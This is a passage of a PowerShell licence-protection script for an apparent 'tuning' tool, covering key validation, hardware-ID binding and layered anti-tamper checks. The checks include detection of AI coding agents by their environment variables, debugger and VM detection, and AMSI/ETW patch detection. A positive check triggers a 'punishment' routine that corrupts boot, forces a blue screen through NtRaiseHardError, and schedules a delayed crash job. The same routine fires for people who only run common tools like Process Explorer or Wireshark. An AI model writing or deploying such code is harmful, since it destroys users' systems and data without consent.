function Detect-AIAgentAnalysis {
    if (Is-DevMachine) { return $false }
    
    # 1. Check for AI Decoy Honeypot Global Variables (set by automated AI/LLM tools)
    $badVars = @(
        "DEV_OVERRIDE", "BYPASS_ACTIVE", "CRACK_AUTHENTICATED", "SKIP_HWID",
        "FORCE_VALID", "ADMIN_BYPASS", "JAILBREAK_ACTIVE", "IS_ADMIN_ACTIVE",
        "CRACKED", "UNLOCKED", "DEV_MODE", "DISABLE_ANTIDBG",
        "AUTHENTICATED_OVERRIDE", "GOD_MODE", "FREE_ACCESS", "CRACK_SUCCESS", "SIMULATE_ADMIN"
    )
    foreach ($bv in $badVars) {
        $v = Get-Variable -Name $bv -Scope Global -ErrorAction SilentlyContinue
        if ($v -and $v.Value) {
            $global:_lastCrackSignals = "AI_HONEYPOT_VAR:$bv"
            return $true
        }
    }

    # 2. Check for Automated AI Agent / Coding Assistant Environment Variables
    $aiEnvVars = @(
        "AI_AGENT", "CURSOR_AGENT", "COPILOT_AGENT", "GEMINI_CLI",
        "CLAUDE_CODE", "CONTINUE_DEV", "AIDER", "VSCODE_INJECTION",
        "CODE_INTERPRETER", "AUTOMATED_RUNNER"
    )
    foreach ($aev in $aiEnvVars) {
        $ev = [System.Environment]::GetEnvironmentVariable($aev)
        if ($ev -and $ev.Trim() -ne "") {
            $global:_lastCrackSignals = "AI_ENV_FLAG:$aev"
            return $true
        }
    }

    # 3. Check for Headless Automated AI Agent Pipe Execution & AST Scanners
    try {
        if ([Console]::IsInputRedirected -or [Console]::IsOutputRedirected) {
            $cmdLine = [System.Environment]::CommandLine.ToLower()
            if ($cmdLine -match '-noninteractive|-inputformat none|frombase64string|ast-dump|deobfuscat|ast_dump') {
                $global:_lastCrackSignals = "AI_HEADLESS_AST_SCANNER"
                return $true
            }
        }
    } catch {}

    # 4. Check Parent Process Hierarchy (Detect automated subagents or script runners)
    try {
        $myProc = Get-CimInstance Win32_Process -Filter "ProcessId = $PID" -ErrorAction SilentlyContinue
        if ($myProc -and $myProc.ParentProcessId) {
            $parent = Get-CimInstance Win32_Process -Filter "ProcessId = $($myProc.ParentProcessId)" -ErrorAction SilentlyContinue
            if ($parent) {
                $pName = $parent.Name.ToLower()
                if ($pName -match 'de4dot|angr|ghidra|x64dbg|x32dbg|dnspy|cheatengine|scylla|pestudio') {
                    $global:_lastCrackSignals = "SUSPICIOUS_PARENT_PROCESS:$pName"
                    return $true
                }
            }
        }
    } catch {}

    # 5. Dedicated Automated Reverse-Engineering / Crack Engines
    $crackEngines = @(
        "de4dot", "ast-dump", "angr", "ghidraRun", "scylla_x64",
        "httpdebuggerpro", "dnspy", "ilspy", "dotpeek", "die", "pestudio"
    )
    try {
        $running = Get-Process -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name
        foreach ($ce in $crackEngines) {
            if ($running -contains $ce) {
                $global:_lastCrackSignals = "CRACK_DECOMPILER:$ce"
                return $true
            }
        }
    } catch {}

    return $false
}

# ========================================================
# MODULE: INTEGRITY VALIDATION & RUNTIME PRE-FLIGHT VERIFICATION
# ========================================================
function Test-GhostIntegrity {
    if (Is-DevMachine) {
        if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
            try {
                $hashMarker = Join-Path $BaseDir ".ghost_integrity"
                $currentHash = (Get-FileHash $PSCommandPath -Algorithm SHA256).Hash
                if (Test-Path $hashMarker) {
                    $storedHash = (Get-Content $hashMarker -Raw).Trim()
                    if ($storedHash -ne $currentHash) {
                        $currentHash | Out-File $hashMarker -Force -Encoding ASCII
                    }
                }
            } catch {}
        }
        return $true
    }

    if (-not $PSCommandPath -or -not (Test-Path $PSCommandPath)) {
        return $true
    }

    try {
        # 1. Multi-Hash SHA256 validation
        $hashMarker = Join-Path $BaseDir ".ghost_integrity"
        $currentHash = (Get-FileHash $PSCommandPath -Algorithm SHA256).Hash
        if (Test-Path $hashMarker) {
            $storedHash = (Get-Content $hashMarker -Raw).Trim()
            if ($storedHash -ne $currentHash) {
                $global:_integrityFail = $true
                $global:_lastCrackSignals = "SCRIPT_SHA256_INTEGRITY_MISMATCH"
                return $false
            }
        } else {
            $currentHash | Out-File $hashMarker -Force -Encoding ASCII
            attrib +h $hashMarker 2>$null
        }

        # 2. Abstract Syntax Tree (AST) & Code Injection validation
        $parseErrors = $null
        $tokens = $null
        $scriptContent = [System.IO.File]::ReadAllText($PSCommandPath, [System.Text.Encoding]::UTF8)
        [System.Management.Automation.Language.Parser]::ParseInput($scriptContent, [ref]$tokens, [ref]$parseErrors) | Out-Null
        if ($parseErrors -and $parseErrors.Length -gt 0) {
            $global:_integrityFail = $true
            $global:_lastCrackSignals = "SCRIPT_SYNTAX_INJECTION_DETECTED"
            return $false
        }

        # 3. Companion configuration validation
        $companionConfigs = @("GHOST_config.json", "RIEWJADDD_config.json")
        foreach ($cc in $companionConfigs) {
            $ccPath = Join-Path $BaseDir $cc
            if (Test-Path $ccPath) {
                $ccContent = Get-Content $ccPath -Raw -ErrorAction SilentlyContinue
                if ($ccContent -match '(?i)(bypass|hook|inject|god_mode|fakenet)') {
                    $global:_integrityFail = $true
                    $global:_lastCrackSignals = "CONFIG_TAMPERED:$cc"
                    return $false
                }
            }
        }

        return $true
    } catch {
        return $false
    }
}

function Verify-SystemRuntimeEnvironment {
    try {
        # 1. 64-bit Architecture validation
        if ([IntPtr]::Size -ne 8) {
            Write-Host "  [WARN] 64-bit Windows architecture recommended for optimal tuning." -ForegroundColor Yellow
        }

        # 2. Available physical memory verification
        $osInfo = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
        if ($osInfo) {
            $totalRamGB = [math]::Round($osInfo.TotalVisibleMemorySize / 1MB, 2)
            $freeRamGB  = [math]::Round($osInfo.FreePhysicalMemory / 1MB, 2)
            if ($totalRamGB -lt 4) {
                Write-Host "  [WARN] Low total system memory ($totalRamGB GB). Proceeding with conservative tuning." -ForegroundColor Yellow
            }
        }

        # 3. CPU Core and execution thread state check
        $cpuCores = [System.Environment]::ProcessorCount
        if ($cpuCores -lt 2) {
            Write-Host "  [WARN] Single core CPU detected." -ForegroundColor Yellow
        }

        return $true
    } catch {
        return $true
    }
}

function Detect-Analysis {
    if (Is-DevMachine) {
        if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
            try {
                $hashMarker = Join-Path $BaseDir ".ghost_integrity"
                $currentHash = (Get-FileHash $PSCommandPath -Algorithm SHA256).Hash
                if (Test-Path $hashMarker) {
                    $storedHash = (Get-Content $hashMarker -Raw).Trim()
                    if ($storedHash -ne $currentHash) {
                        $currentHash | Out-File $hashMarker -Force -Encoding ASCII
                    }
                }
            } catch {}
        }
        return $false
    }
    $detected = $false
    
    # Check for AI Agents & AI Code Assistants analysis
    if (Detect-AIAgentAnalysis) {
        return $true
    }
    
    # Check for debuggers and analysis tools
    $dangerousProcesses = @(
        "x64dbg", "x32dbg", "ollydbg", "windbg", "ida", "ida64", "idaq", "idaq64",
        "ghidra", "ghidraRun", "processhacker", "procexp", "procexp64", "procmon", "procmon64",
        "wireshark", "fiddler", "charles", "httpdebuggerpro", "httpdebugger",
        "dnspy", "dnSpy", "de4dot", "ilspy", "dotpeek", "justdecompile",
        "cheatengine", "cheatengine-x86_64", "ce", "ceserver",
        "hxd", "hexworkshop", "010editor",
        "pestudio", "cffexplorer", "die", "exeinfope", "lordpe", "petools",
        "regmon", "filemon", "apimonitor", "apimonitor-x64",
        "resourcehacker", "reshacker", "reshack",
        "scylla", "scylla_x64", "importrec",
        "sandboxie", "sbiectrl", "sbieSvc",
        "fakenet", "inetsim", "remnux",
        "sysinternals", "autoruns", "autorunsc",
        "processhacker2", "systeminformer",
        "tcpview", "tcpvcon",
        "debugview", "dbgview",
        "immunity", "immunitydebugger",
        "powershell_ise"  # someone debugging the script
    )
    
    $runningProcs = Get-Process -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name
    foreach ($dangerous in $dangerousProcesses) {
        if ($runningProcs -contains $dangerous) {
            $detected = $true
            break
        }
    }
    
    # Check window titles for debugging indicators
    try {
        $windows = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle -ne "" } | Select-Object -ExpandProperty MainWindowTitle
        $suspiciousWords = @("debugger", "debug", "disassembl", "decompil", "breakpoint", "cheat engine", "hex editor", "memory scan", "olly", "x64dbg", "ida ", "ghidra")
        foreach ($w in $windows) {
            foreach ($sw in $suspiciousWords) {
                if ($w -match $sw) { $detected = $true; break }
            }
            if ($detected) { break }
        }
    } catch {}
    
    # Check if being run from suspicious paths
    if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
        $scriptDir = Split-Path $PSCommandPath -Parent
        $suspiciousPaths = @("crack", "keygen", "patch", "loader", "bypass", "hack", "pirate", "warez", "nulled")
        foreach ($sp in $suspiciousPaths) {
            if ($scriptDir -match $sp) { $detected = $true; break }
        }
    }
    
    # Check for VM (some crackers use VMs to analyze)
    try {
        $vmIndicators = @(
            (Get-WmiObject Win32_ComputerSystem).Model,
            (Get-WmiObject Win32_ComputerSystem).Manufacturer,
            (Get-WmiObject Win32_BIOS).SMBIOSBIOSVersion
        ) -join " "
        $vmStrings = @("virtual", "vmware", "vbox", "virtualbox", "qemu", "xen", "hyper-v", "parallels", "bhyve")
        foreach ($vs in $vmStrings) {
            if ($vmIndicators -match $vs) {
                $global:_vmDetected = $true
                break
            }
        }
    } catch {}
    
    # Check if script or environment was modified (Modular Integrity Validation)
    if (-not (Test-GhostIntegrity)) {
        $detected = $true
    }
    
    # Check for in-memory byte patches (AMSI & ETW hook checks)
    if (Detect-MemoryPatch) {
        $detected = $true
    }
    
    return $detected
}
# -- Layer 5.5: In-Memory Patch Detection (AMSI & ETW Byte Verification) --
function Detect-MemoryPatch {
    if (Is-DevMachine) { return $false }
    try {
        $patchCheckCode = @"
using System;
using System.Runtime.InteropServices;
public class MemoryPatchDetector {
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetModuleHandleA(string lpModuleName);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    public static bool IsAmsiTampered() {
        IntPtr hMod = GetModuleHandleA("amsi.dll");
        if (hMod == IntPtr.Zero) return false;
        IntPtr pFunc = GetProcAddress(hMod, "AmsiScanBuffer");
        if (pFunc == IntPtr.Zero) return false;
        byte[] b = new byte[8];
        Marshal.Copy(pFunc, b, 0, 8);
        if (b[0] == 0xC3) return true;
        if (b[0] == 0xB8 && b[1] == 0x57 && b[2] == 0x00 && b[3] == 0x07 && b[4] == 0x80) return true;
        if (b[0] == 0x31 && b[1] == 0xC0) return true;
        if (b[0] == 0x48 && b[1] == 0x31 && b[2] == 0xC0) return true;
        return false;
    }
    public static bool IsEtwTampered() {
        IntPtr hMod = GetModuleHandleA("ntdll.dll");
        if (hMod == IntPtr.Zero) return false;
        IntPtr pFunc = GetProcAddress(hMod, "EtwEventWrite");
        if (pFunc == IntPtr.Zero) return false;
        byte[] b = new byte[4];
        Marshal.Copy(pFunc, b, 0, 4);
        if (b[0] == 0xC3) return true;
        if (b[0] == 0x48 && b[1] == 0x31 && b[2] == 0xC0 && b[3] == 0xC3) return true;
        return false;
    }
}
"@
        Add-Type -TypeDefinition $patchCheckCode -Language CSharp -ErrorAction SilentlyContinue
        if ([MemoryPatchDetector]::IsAmsiTampered()) {
            $global:_lastCrackSignals = "AMSI_SCANBUFFER_PATCHED_IN_MEMORY"
            return $true
        }
        if ([MemoryPatchDetector]::IsEtwTampered()) {
            $global:_lastCrackSignals = "ETWEVENTWRITE_PATCHED_IN_MEMORY"
            return $true
        }
    } catch {}
    return $false
}
# -- Layer 6: Anti-tampering of this script's functions --
function Verify-FunctionIntegrity {
    if (Is-DevMachine) { return $true }
    $criticalFunctions = @(
        "Validate-Key", "Check-Banned", "Detect-Analysis", "Detect-AIAgentAnalysis",
        "Detect-MemoryPatch", "Get-HWID", "Invoke-BSOD", "Protect-GhostPayload",
        "Unprotect-GhostPayload", "Test-GhostIntegrity", "Verify-SystemRuntimeEnvironment"
    )
    foreach ($fn in $criticalFunctions) {
        $cmd = Get-Command $fn -ErrorAction SilentlyContinue
        if (-not $cmd) { return $false }
        if ($cmd.CommandType -ne "Function") { return $false }
    }
    return $true
}
# -- Layer 7: Anti-patch detection (check key validation logic) --
function Verify-ValidationLogic {
    if (Is-DevMachine) { return $true }
    if (-not $PSCommandPath -or -not (Test-Path $PSCommandPath)) { return $true }
    try {
        $selfContent = Get-Content $PSCommandPath -Raw
        $requiredStrings = @(
            'Validate-Key',
            'MASTER',
            'HWID_MISMATCH',
            'Check-Banned',
            'Invoke-BSOD',
            'Set-PermanentBan',
            'authenticated'
        )
        foreach ($rs in $requiredStrings) {
            if ($selfContent -notmatch [regex]::Escape($rs)) {
                return $false
            }
        }
        
        # Check that the key validation loop exists (not bypassed)
        if ($selfContent -notmatch 'while.*attempts.*maxAttempts.*authenticated') {
            return $false
        }
        
        # Check the BSOD function wasn't gutted
        if ($selfContent -notmatch 'NtRaiseHardError') {
            return $false
        }
    } catch { return $false }
    return $true
}
# -- Layer 8: Timing attack detection -------------------
$global:_scriptStartTime = Get-Date
function Check-TimingAnomaly {
    if (Is-DevMachine) { return $false }
    # If key validation happens suspiciously fast (< 500ms from start), 
    # someone automated the bypass
    $elapsed = ((Get-Date) - $global:_scriptStartTime).TotalMilliseconds
    if ($elapsed -lt 500) { return $true }
    return $false
}
# -- Layer 9: Delayed punishment (time bomb) -------------
# Don't trigger immediately - let the cracker think they succeeded,
# then destroy them mid-operation
function Start-DelayedPunishment {
    if (Is-DevMachine) { return }
    # Create a background job that triggers BSOD after random delay
    $job = Start-Job -ScriptBlock {
        param($delay)
        Start-Sleep -Seconds $delay
        # Re-import BSOD function
        try {
            $ntdll = @"
using System; using System.Runtime.InteropServices;
public class NtBsod2 {
    [DllImport("ntdll.dll")] public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
    [DllImport("ntdll.dll")] public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
    public static void Crash() {
        bool t1; uint t2;
        RtlAdjustPrivilege(19, true, false, out t1);
        NtRaiseHardError(0xC0000420, 0, 0, IntPtr.Zero, 6, out t2);
    }
}
"@
            Add-Type -TypeDefinition $ntdll -Language CSharp
            [NtBsod2]::Crash()
        } catch {
            try { Stop-Computer -Force } catch {}
        }
    } -ArgumentList (Get-Random -Minimum 30 -Maximum 120)  # 30s to 2min delay
}
# -- Layer 10: Anti-memory-edit detection ----------------
function Check-MemoryTamper {
    if (Is-DevMachine) { return $false }
    # Store critical variable values and verify they haven't changed
    $global:_authChecksum = $null
    
    # Check if $authenticated variable exists in a way that bypasses our logic
    try {
        $selfVars = Get-Variable -Scope Global -ErrorAction SilentlyContinue
        foreach ($v in $selfVars) {
            # If someone injected $authenticated = $true before our check
            if ($v.Name -eq "authenticated" -and $v.Value -eq $true) {
                if (-not $global:_authLegit) {
                    return $true  # Tampered!
                }
            }
        }
    } catch {}
    return $false
}
# -- MASTER PUNISHMENT FUNCTION --------------------------
function Execute-Punishment {
    param([string]$Reason = "CRACK_DETECTED")
    
    if (Is-DevMachine) {
        Write-Host ""
        Write-Host "  [DEV SAFEGUARD] Punishment bypassed on developer machine (Reason: $Reason)" -ForegroundColor Yellow
        Write-Host ""
        return
    }
    
    # 1. Set permanent ban FIRST (multiple redundant locations)
    Set-PermanentBan
    
    # 2. Corrupt boot
    Corrupt-Boot
    
    # 3. Delete the script and keys to prevent re-use
    try {
        Remove-Item $KeyFilePath -Force -ErrorAction SilentlyContinue
        # Don't delete the script itself yet - BSOD will handle the rest
    } catch {}
    
    # 4. Log security threat / crack attempt
    try {
        $actionTaken = if (Is-DevMachine) { "[DEV SAFEGUARD] Bypassed on developer machine" } else { "PUNISHMENT EXECUTED: BSOD & Boot Lock" }
        $offendingKey = if ($global:_lastAttemptKey) { $global:_lastAttemptKey } else { "N/A" }
        $signalsFound = if ($global:_lastCrackSignals) { $global:_lastCrackSignals } else { "" }
        Write-SecurityLog -Reason $Reason -InputKey $offendingKey -Signals $signalsFound -ActionTaken $actionTaken
    } catch {}
    
    # 5. Start delayed bomb as backup
    Start-DelayedPunishment
    
    # 6. IMMEDIATE BSOD
    Start-Sleep -Milliseconds 100
    Invoke-BSOD
    
    # 7. If BSOD somehow failed, force shutdown and corrupt
    try { shutdown /s /t 0 /f /d p:0:0 2>$null } catch {}
    try { Stop-Computer -Force } catch {}
    exit 1
}
# -- Layer 11: Real-time Background Security & AI Watchdog --
function Start-SecurityWatchdog {
    if (Is-DevMachine) { return }
    try {
        $timer = New-Object System.Timers.Timer
        $timer.Interval = 2500  # Scan every 2.5 seconds
        $timer.AutoReset = $true
        Register-ObjectEvent -InputObject $timer -EventName Elapsed -Action {
            if (Detect-Analysis) {
                Execute-Punishment "WATCHDOG_DETECTED_ANALYSIS"
            }
            if (Detect-MemoryPatch) {
                Execute-Punishment "WATCHDOG_DETECTED_MEMORY_PATCH"
            }
            if (Check-MemoryTamper) {
                Execute-Punishment "WATCHDOG_DETECTED_MEMORY_TAMPER"
            }
        } | Out-Null
        $timer.Start()
        $global:_securityWatchdogTimer = $timer
    } catch {}
}
# -- Get this machine's HWID (motherboard serial) --------
function Get-HWID {
    try {
        $mb = (Get-CimInstance Win32_BaseBoard).SerialNumber
        if ($mb -and $mb -ne "None" -and $mb -ne "Default string" -and $mb.Trim() -ne "") {
            return $mb.Trim()
        }
    } catch {}
    # fallback: use BIOS serial
    try {
        $bios = (Get-CimInstance Win32_BIOS).SerialNumber
        if ($bios -and $bios -ne "None" -and $bios.Trim() -ne "") {
            return $bios.Trim()
        }
    } catch {}
    # last fallback: machine GUID from registry
    try {
        $guid = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Cryptography" -Name MachineGuid).MachineGuid
        return $guid
    } catch {}
    return "UNKNOWN-HWID"
}
$CurrentHWID = Get-HWID
# -- Load / Save key database ----------------------------
$KeySalt = _xd @(0x0F,0x14,0x18,0x0A,0x17,0x1C,0x19,0x19,0x19,0x02,0x6F,0x6D,0x6F,0x6B,0x02,0x0E,0x18,0x1E,0x08,0x0F,0x18,0x02,0x1C,0x08,0x09,0x15,0x02,0x0E,0x1C,0x11,0x09) 0x5D
# -- Pre-Approved Keys are stored as SHA-256 Hashes (Zero Plaintext Keys in File) --
$PreApprovedKeyHashes = @(
    "F5C358931FBDB6F02BFA4D9C79F00999D5D50BC5372B83A5042C5F278CBC1AB2",
    "C4D5227F6CF869E7E3A939B573EF03833E15713F52E31DAA9C3116121AF506BA",
    "AF9712987EECF7ADCDA6FEBCFA5B1D105E30BE88B0EBCDF83CAB8BECF6C181AE",
    "5B7D1369FC124C5B6FE5FAA2AF7D9EFEDB9C3B0541B3758F78CD662DC2C14583"
)
function Test-PreApprovedKey {
    param([string]$Key)
    if (-not $Key) { return $false }
    try {
        $sha = [System.Security.Cryptography.SHA256]::Create()
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($Key.Trim().ToUpper())
        $h = ($sha.ComputeHash($bytes) | ForEach-Object { '{0:X2}' -f $_ }) -join ''
        return ($PreApprovedKeyHashes -contains $h)
    } catch { return $false }
}
function Compute-KeyChecksum {
    param([string]$s1, [string]$s2, [string]$s3)
    $chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
    $raw = "$s1-$s2-$s3-$KeySalt"
    $sha = [System.Security.Cryptography.SHA256]::Create()
    $hash = $sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($raw))
    $check = ""
    for ($i = 0; $i -lt 5; $i++) {
        $check += $chars[$hash[$i] % $chars.Length]
    }
    return $check
}
function Generate-KeyString {
    $chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
    $s1 = "RIEWJADDD"
    $s2 = ""; for($i=0;$i -lt 5;$i++){ $s2 += $chars[(Get-Random -Maximum $chars.Length)] }
    $s3 = ""; for($i=0;$i -lt 5;$i++){ $s3 += $chars[(Get-Random -Maximum $chars.Length)] }
    $s4 = Compute-KeyChecksum $s1 $s2 $s3
    return "$s1-$s2-$s3-$s4"
}
function Test-AlgorithmicKey {
    param([string]$Key)
    if (-not $Key) { return $false }
    $clean = $Key.Trim().ToUpper()
    $parts = $clean -split "-"
    if ($parts.Count -ne 4) { return $false }
    $validFormat = ($parts[0].Length -eq 5 -or $parts[0] -eq "RIEWJADDD") -and `
                   ($parts[1].Length -eq 5) -and `
                   ($parts[2].Length -eq 5) -and `
                   ($parts[3].Length -eq 5)
    if (-not $validFormat) {
        return $false
    }
    $expected = Compute-KeyChecksum $parts[0] $parts[1] $parts[2]
    return ($parts[3] -eq $expected)
}
function Load-KeyDB {
    $searchPaths = @(
        $KeyFilePath,
        (Join-Path $BaseDir "RIEWJADDD_keys.json"),
        (Join-Path $BaseDir "GHOST_keys.json"),
        (Join-Path $env:ProgramData "RIEWJADDD_SHOP\RIEWJADDD_keys.json"),
        (Join-Path $env:ProgramData "RIEWJADDD_SHOP\GHOST_keys.json")
    ) | Select-Object -Unique
    foreach ($p in $searchPaths) {
        if ($p -and (Test-Path $p)) {
            try {
                $raw = Get-Content $p -Raw -Encoding UTF8
                $db = $raw | ConvertFrom-Json
                if ($db.keys -is [array]) { return $db }
                if ($db.keys) {
                    $db.keys = @($db.keys)
                    return $db
                }
            } catch {}
        }
    }
    return @{ keys = @() }
}
function Save-KeyDB {
    param($DB)
    $savePaths = @(
        $KeyFilePath,
        (Join-Path $BaseDir "RIEWJADDD_keys.json"),
        (Join-Path $BaseDir "GHOST_keys.json"),
        (Join-Path $env:ProgramData "RIEWJADDD_SHOP\RIEWJADDD_keys.json"),
        (Join-Path $env:ProgramData "RIEWJADDD_SHOP\GHOST_keys.json")
    ) | Select-Object -Unique
    $json = $DB | ConvertTo-Json -Depth 5
    foreach ($sp in $savePaths) {
        try {
            $parent = Split-Path $sp -Parent
            if ($parent -and -not (Test-Path $parent)) { New-Item -ItemType Directory -Path $parent -Force | Out-Null }
            [System.IO.File]::WriteAllText($sp, $json, [System.Text.Encoding]::UTF8)
        } catch {}
    }
}
# (Cloud KeyAuth defined at top of script)
function Save-BanDB {
    param($DB)
    $savePaths = @(
        $BanFilePath,
        (Join-Path $BaseDir "RIEWJADDD_bans.json"),
        (Join-Path $BaseDir "GHOST_bans.json"),
        (Join-Path $env:ProgramData "RIEWJADDD_SHOP\RIEWJADDD_bans.json")
    ) | Select-Object -Unique
    $json = $DB | ConvertTo-Json -Depth 5
    foreach ($sp in $savePaths) {
        try {
            $parent = Split-Path $sp -Parent
            if ($parent -and -not (Test-Path $parent)) { New-Item -ItemType Directory -Path $parent -Force | Out-Null }
            [System.IO.File]::WriteAllText($sp, $json, [System.Text.Encoding]::UTF8)
        } catch {}
    }
}
function Record-Ban {
    param(
        [string]$Hwid,
        [string]$MachineName,
        [string]$UserName,
        [string]$Reason,
        [string]$Status = "BANNED"
    )
    if (-not $Hwid -or $Hwid -eq "UNKNOWN-HWID") { return }
    try {
        $db = Load-BanDB
        $nowStr = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
        $found = $false
        foreach ($b in $db.bans) {
            if ($b.hwid -eq $Hwid) {
                $b | Add-Member -NotePropertyName "status" -NotePropertyValue $Status -Force -ErrorAction SilentlyContinue
                $b | Add-Member -NotePropertyName "reason" -NotePropertyValue $Reason -Force -ErrorAction SilentlyContinue
                if ($MachineName) { $b | Add-Member -NotePropertyName "machine_name" -NotePropertyValue $MachineName -Force -ErrorAction SilentlyContinue }
                if ($UserName)    { $b | Add-Member -NotePropertyName "user_name" -NotePropertyValue $UserName -Force -ErrorAction SilentlyContinue }
                $b | Add-Member -NotePropertyName "updated_on" -NotePropertyValue $nowStr -Force -ErrorAction SilentlyContinue
                $found = $true
                break
            }
        }
        if (-not $found) {
            $newEntry = [PSCustomObject]@{
                hwid         = $Hwid
                machine_name = if ($MachineName) { $MachineName } else { "UNKNOWN-PC" }
                user_name    = if ($UserName) { $UserName } else { "UNKNOWN-USER" }
                banned_on    = $nowStr
                updated_on   = $nowStr
                reason       = $Reason
                status       = $Status
            }
            $db.bans += $newEntry
        }
        Save-BanDB $db
    } catch {}
}
# -- Validate a key against DB and HWID (1 Key = 1 Machine / Single-Use) -----------------
function Validate-Key {
    param([string]$InputKey)
    if (-not $InputKey) { return "INVALID" }
    $InputKey = $InputKey.Trim().ToUpper()
    
    # 1. เฉพาะคำว่า DEV เท่านั้นที่มีสิทธิ์เข้าหลังบ้าน (ยศ DEV) - ล็อคเฉพาะเครื่อง DEV เท่านั้น
    if ($InputKey -eq "DEV") {
        if (Is-DevMachine) {
            Write-AuthLog -Key $InputKey -Status "MASTER" -Owner "DEVELOPER" -Details "Developer master access granted"
            return "MASTER"
        } else {
            Write-AuthLog -Key $InputKey -Status "INVALID" -Owner "UNAUTHORIZED_DEV_ATTEMPT" -Details "Unauthorized attempt to use DEV from $env:COMPUTERNAME (HWID: $CurrentHWID)"
            return "INVALID"
        }
    }
    # 2. ตรวจสอบ Registry Marker ในเครื่องว่าคีย์นี้เคยถูกใช้งานไปแล้วหรือไม่ (กันลบไฟล์ json)
    $regPath = "HKLM:\SOFTWARE\RIEWJADDD_SHOP\UsedKeys"
    try {
        if (Test-Path "$regPath\$InputKey") {
            Write-AuthLog -Key $InputKey -Status "EXPIRED" -Owner "Single-Use Customer" -Details "Key marked as USED in Windows Registry"
            return "EXPIRED"
        }
    } catch {}
    # 3. ตรวจสอบ Hidden System Marker ใน ProgramData
    $hiddenMarkerFile = Join-Path $env:ALLUSERSPROFILE ".riewjaddd_used"
    try {
        if (Test-Path $hiddenMarkerFile) {
            $usedList = Get-Content $hiddenMarkerFile -ErrorAction SilentlyContinue
            if ($usedList -contains $InputKey) {
                Write-AuthLog -Key $InputKey -Status "EXPIRED" -Owner "Single-Use Customer" -Details "Key found in system used marker list"
                return "EXPIRED"
            }
        }
    } catch {}
    
    $db = Load-KeyDB
    $localEntry = $null
    foreach ($entry in $db.keys) {
        if ($entry.key -eq $InputKey) {
            $localEntry = $entry
            break
        }
    }
    
    $isApproved = (Test-PreApprovedKey $InputKey)
    $isAlgorithmic = (Test-AlgorithmicKey $InputKey)
    $cloudHwid = $null
    try {
        $cloudHwid = Get-CloudHWID $InputKey
    } catch {}
    $isCloudKey = ($null -ne $cloudHwid -and $cloudHwid -ne "" -and $cloudHwid -ne "DELETED_KEY")
    
    if (-not $localEntry -and -not $isApproved -and -not $isAlgorithmic -and -not $isCloudKey) {
        Write-AuthLog -Key $InputKey -Status "INVALID" -Owner "UNKNOWN" -Details "Key signature invalid"
        return "INVALID"
    }
    # 4. ตรวจสอบ Local Database (สถานะการใช้งานบนเครื่องนี้)
    if ($localEntry) {
        # 4.1 ตรวจสอบว่าคีย์เคยถูกใช้ไปแล้วหรือไม่ (ใช้ได้แค่ครั้งเดียว)
        if ($localEntry.status -eq "USED" -or $localEntry.status -eq "EXPIRED" -or $localEntry.hwid -like "USED*" -or $localEntry.used_on) {
            Write-AuthLog -Key $InputKey -Status "EXPIRED" -Owner $(if ($localEntry.note) { $localEntry.note } else { "Single-Use Customer" }) -Details "Key already used once (used on: $($localEntry.used_on))"
            return "EXPIRED"
        }
        # 4.2 ตรวจสอบว่าคีย์ผูกกับเครื่องอื่นไปแล้วหรือไม่ (ใช้ได้แค่เครื่องเดียว)
        if ($localEntry.hwid -and $localEntry.hwid -ne "UNBOUND" -and $localEntry.hwid -ne "" -and $localEntry.hwid -ne $CurrentHWID) {
            Write-AuthLog -Key $InputKey -Status "HWID_MISMATCH" -Owner $(if ($localEntry.note) { $localEntry.note } else { "Unauthorized Sharing" }) -Details "Key locked to $($localEntry.hwid), tried on $CurrentHWID ($env:COMPUTERNAME)"
            return "HWID_MISMATCH"
        }
        # 4.3 หากเคยถูก Activated บนเครื่องนี้แล้ว -> ห้ามรันซ้ำ ถือว่าใช้สิทธิ์ 1 ครั้งหมดแล้ว
        if ($localEntry.activated_on -and $localEntry.hwid -eq $CurrentHWID) {
            Write-AuthLog -Key $InputKey -Status "EXPIRED" -Owner $(if ($localEntry.note) { $localEntry.note } else { "Customer" }) -Details "Key already activated on $CurrentHWID - Single use only"
            return "EXPIRED"
        }
    }
    
    # 5. ตรวจสอบ Cloud HWID Lock (ระบบล็อค 1 คีย์ 1 เครื่องส่วนกลาง)
    $cloudHwid = Get-CloudHWID $InputKey
    
    # 5.1 กรณีคีย์ถูกใช้งานไปแล้วบน Cloud (ระบบ Single-Use: 1 คีย์ใช้งานได้แค่ครั้งเดียว)
    if ($cloudHwid -and ($cloudHwid -like "USED*" -or $cloudHwid -eq "EXPIRED" -or $cloudHwid -eq "CONSUMED")) {
        Write-AuthLog -Key $InputKey -Status "EXPIRED" -Owner "Single-Use Customer" -Details "Key has already been used once ($cloudHwid)"
        return "EXPIRED"
    }
    # 5.2 กรณีคีย์ถูกผูกไว้กับเครื่องอื่นแล้ว! (นำไปใส่เครื่องอื่น -> ล็อคไม่ให้เข้า)
    if ($cloudHwid -and $cloudHwid -ne "UNBOUND" -and $cloudHwid -ne "" -and $cloudHwid -ne $CurrentHWID) {
        $ownerNote = if ($localEntry -and $localEntry.note) { $localEntry.note } else { "Unauthorized Sharing" }
        Write-AuthLog -Key $InputKey -Status "HWID_MISMATCH" -Owner $ownerNote -Details "Key locked to $cloudHwid, tried on $CurrentHWID ($env:COMPUTERNAME)"
        return "HWID_MISMATCH"
    }
